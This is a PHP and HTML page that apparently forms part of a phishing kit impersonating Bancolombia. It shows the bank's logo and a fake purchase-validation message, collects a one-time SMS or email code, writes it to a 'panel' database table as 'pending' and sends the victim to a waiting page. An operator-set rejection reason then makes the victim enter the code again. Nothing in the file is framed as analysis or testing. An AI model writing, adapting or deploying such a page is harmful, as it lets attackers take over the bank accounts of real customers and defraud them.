<?php
require_once '../bancol/config.php';
$conn = getConnection();
$uuid = $conn->real_escape_string($_GET['id']);

$stmt = $conn->prepare("SELECT dato3, rejected_reason, redirect_flag FROM  panel WHERE id = ?");
$stmt->bind_param("s", $uuid);
$stmt->execute();
$result = $stmt->get_result();
$data = $result->fetch_assoc();

if (!$data || !$data['redirect_flag']) { // <--- Usar $data aquí
    die('Redirección no autorizada');
}



if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $dato3 = $conn->real_escape_string($_POST['dato3']);
    
    $stmt = $conn->prepare("UPDATE  panel SET dato3 = ?, dato3_status = 'pending', rejected_reason = NULL WHERE id = ?");
    $stmt->bind_param("ss", $dato3, $uuid);
    $stmt->execute();
    $stmt->close();
    $conn->close();
    
    header("Location: espera_validacion.php?id=$uuid");
    exit();
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguridad</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            margin: 0;
        }

        .container {
            background-color: white;
            padding: 2rem;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 90%;
            max-width: 400px;
            text-align: center;
        }

        .logo img {
            width: 100px;
            margin-bottom: 1rem;
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            color: #333;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: stretch;
        }

        label {
            text-align: left;
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
            color: #555;
        }

        select, input {
            padding: 0.8rem;
            margin-bottom: 1rem;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 1rem;
            color: #333;
            width: 100%;
            box-sizing: border-box;
        }

        .forgot-password {
            text-align: right;
            display: block;
            margin-bottom: 1.5rem;
            color: #0066cc;
            font-size: 0.9rem;
        }

        .login-button {
            background-color: #000000;
            border: none;
            padding: 0.8rem;
            border-radius: 5px;
            font-size: 1rem;
            color: #ffffff;
            cursor: not-allowed;
            margin-bottom: 1.5rem;
        }

        .register {
            font-size: 0.9rem;
            color: #555;
        }

        .register a {
            color: #0066cc;
            text-decoration: none;
        }

        .register a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">

        <div style=" padding-bottom: 5%; border-style: solid; border-width: 0px 0px 1px 0px; border-color: gray;">
            <img style="width: 70%;" src="img/BANCOLOMBIA.png" alt="">
        </div>

        <div style="margin-top: 1%; margin-bottom: 8%;">
            <p style="margin-bottom: 8%; "><strong>Vamos a valiar tu compra</strong></p>
            <p style="text-align: left;">Espere un momento mientras enviamos el código de validación por SMS o correo. Si no lo recibe, ingrese los datos nuevamente.</p>
            
        </div>

        

    <h1>Ingresa a la Banca Virtual</h1>
    <form method="POST">
    <label for="document-number">Ingrese código de validación</label>
    <?php if(!empty($data['rejected_reason'])): ?>
    <div style=" text-align: start; color: red; padding: 0px; padding-bottom: 8px; border-style: none; font-size: smaller;">
        <?= htmlspecialchars($data['rejected_reason']) ?>
    </div>
    <?php endif; ?>
        <input id="username" placeholder="Código"  type="text" name="dato3" 
               placeholder="Dato adicional requerido" 
               value="<?= htmlspecialchars($data['dato3'] ?? '') ?>"
               required>
        <button id="submitBtn" class="login-button">Continuar</button>
    </form>
        
       

    </div>
</body>
</html>

